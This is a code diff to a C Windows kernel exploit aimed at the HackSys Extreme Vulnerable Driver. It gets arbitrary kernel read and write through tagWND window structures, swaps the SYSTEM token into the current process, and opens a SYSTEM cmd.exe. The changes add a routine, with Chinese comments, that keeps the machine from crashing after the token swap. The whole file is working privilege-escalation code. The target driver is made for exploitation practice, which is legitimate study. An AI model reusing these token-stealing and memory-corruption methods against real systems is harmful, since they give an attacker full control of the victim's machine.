@@ -4,7 +4,6 @@
 #include <profileapi.h>
 typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
 lHMValidateHandle pHmValidateHandle = NULL;
-//提权会成功但是进程退出会蓝屏 原因寻找中
 typedef struct _HEAD
 {
 	HANDLE h;
@@ -34,7 +33,6 @@ BOOL FindHMValidateHandle() {
 		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
 		return FALSE;
 	}
-	//由于HMValidateHandleOffset函数位于IsMenu中，IsMenu中特征码为e8也就是一个call就是HMValidateHandleOffset函数地址
 	unsigned int uiHMValidateHandleOffset = 0;
 	for (unsigned int i = 0; i < 0x1000; i++) {
 		BYTE* test = pIsMenu + i;
@@ -63,7 +61,7 @@ DWORD32 ReadMemory32(HWND hManager, HWND Worker, DWORD64 addr) {
 	//保存原来的数据
 	DWORD dwori3 = GetWindowLong(hManager, strNameaddr + 0x8);
 	DWORD dwori4 = GetWindowLong(hManager, strNameaddr + 0xc);
-	//写入数据修改原来的指针
+	//写入数据
 	SetWindowLongW(hManager, strNameaddr + 0x8, (addr & 0xffffffff));
 	SetWindowLongW(hManager, strNameaddr + 0xc, (addr & 0xffffffff00000000) >> 32);
 	
@@ -87,16 +85,17 @@ VOID ReadMemory64(HWND hManager, HWND Worker, DWORD64 addr, PVOID dst,DWORD64 le
 	{
 		 LowAddr = ReadMemory32(hManager, Worker, addr + 8);
 		 HighAddr = ReadMemory32(hManager, Worker, addr + 8 + sizeof(ULONG32));
+		 HighAddr *= 0x100000000;
 		 read = HighAddr + LowAddr;
-		  HighAddr *= 0x100000000;
 		 *(DWORD64*)((DWORD64)dst+8) = read;
 	}
+	return;
 }
 VOID WriteMemory(HWND hManager, HWND Worker, DWORD64 addr, DWORD64  src) {
 	//保存原来的数据
 	DWORD dwori3 = GetWindowLong(hManager, strNameaddr + 0x8);
 	DWORD dwori4 = GetWindowLong(hManager, strNameaddr + 0xC);
-	//写入数据修改原来的指针
+	//修改指针
 	SetWindowLongW(hManager, strNameaddr + 0x8, (addr & 0xffffffff));
 	SetWindowLongW(hManager, strNameaddr + 0xC, (addr & 0xffffffff00000000) >> 32);
 	//向指针指向的地方写入数据
@@ -150,7 +149,7 @@ int main()
 	printf("tagWNDaddr: %llX\n", tagWNDaddr);
 	printf("tagWND2addr: %llX\n", tagWND2addr);
 
-	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
 	if (hDriver == INVALID_HANDLE_VALUE) {
 		printf("[!] Unable to get a handle on the device\n");
 		getchar();
@@ -212,9 +211,35 @@ int main()
 	ReadMemory64(Manager, Worker, SystemProcess + 0x358,
 		&systemtoken, sizeof(LPVOID));
 	printf("systemtoken=%llX\n", systemtoken);
-	WriteMemory(Manager, Worker, currentProcess + 0x358,
-		systemtoken);
+
+
+	//不这样进程退出会蓝屏
+	//下面是因为写入会往后面多写入一0我这里是判断后面读到0了就直接写然后把读到的内容再还原
+	//其实只要一个字节为0就行了 不过时间有限 写的有点辣眼睛
+	DWORD64 tokenbehind[0x10000]{};
+	int num{};
+	int j = 0;
+	int z =8;
+	for ( size_t i = currentProcess + 0x358+8; ; i+=8)
+	{
+		ReadMemory64(Manager, Worker, i,
+			&tokenbehind[j], sizeof(LPVOID));
+		if (tokenbehind[j]==0)
+		{
+			
+			WriteMemory(Manager, Worker, currentProcess + 0x358,
+				systemtoken);
+			for (size_t y = 0; y < num; y++)
+			{
+				WriteMemory(Manager, Worker, currentProcess + 0x358+z,
+					tokenbehind[y]);
+				z +=8;
+			}		
+			break;
+		}
+		num++;
+		j ++;
+	}
 	system("cmd.exe");
-	getchar();
 	return 0;
 }
